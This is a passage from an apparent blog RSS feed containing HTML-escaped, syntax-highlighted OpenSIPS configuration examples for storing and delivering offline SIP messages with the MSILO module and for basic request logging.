&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;!mf_process_maxfwd_header(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;10&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;sl_send_reply(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;483&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;To Many Hops&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;exit;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;(is_myself(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;$rd&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# for testing purposes, simply okay all REGISTERs
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# is_method(&amp;#34;XYZ&amp;#34;) is faster than ($rm==&amp;#34;XYZ&amp;#34;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;#  but requires textops module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			save&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			log&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER received -&amp;gt; dumping messages with MSILO\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# MSILO - dumping user&amp;#39;s offline messages&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;m_dump&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				log&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;MSILO: offline messages dumped - if they were\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				log&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;MSILO: no offline messages dumped\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# backup r-uri for m_dump() in case of delivery failure&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		$avp&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;11&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $ru;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# domestic SIP destinations are handled using our USRLOC DB&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!lookup&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;! t_newtran&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				sl_reply_error&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# we do not care about anything else but MESSAGEs&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;MESSAGE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!t_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;404&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Not found&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					sl_reply_error&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			log&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;MESSAGE received -&amp;gt; storing using MSILO\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# MSILO - storing as offline message&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;m_store&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$ru&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				log&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;MSILO: offline message stored\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!t_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;202&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Accepted&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					sl_reply_error&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				log&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;MSILO: offline message NOT stored\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!t_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;503&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Service Unavailable&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					sl_reply_error&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# if the downstream UA does not support MESSAGE requests&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# go to failure_route[1]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_on_failure&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_relay&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# forward anything else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	t_relay&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;failure_route[1]&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# forwarding failed -- check if the request was a MESSAGE 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;MESSAGE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	log&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;MSILO: the downstream UA does not support MESSAGE requests ...\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# we have changed the R-URI with the contact address -- ignore it now&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;m_store&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$avp&lt;span style=&#34;color:#e6db74&#34;&gt;(11)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		log&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;MSILO: offline message stored\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;202&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Accepted&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		log&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;MSILO: offline message NOT stored\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;503&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Service Unavailable&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>loggin</title>
      <link>https://wdd.js.org/opensips/ch8/logging/</link>
      <pubDate>Thu, 28 May 2020 09:59:45 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch8/logging/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-makefile&#34; data-lang=&#34;makefile&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# logging example
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ------------------ module loading ----------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;port&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5060&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_stderror&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;yes
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_level&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# -------------------------  request routing logic -------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# main routing logic
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;route{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# for testing purposes, simply okay all REGISTERs
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		log&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER received\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		log&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;non-REGISTER received\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
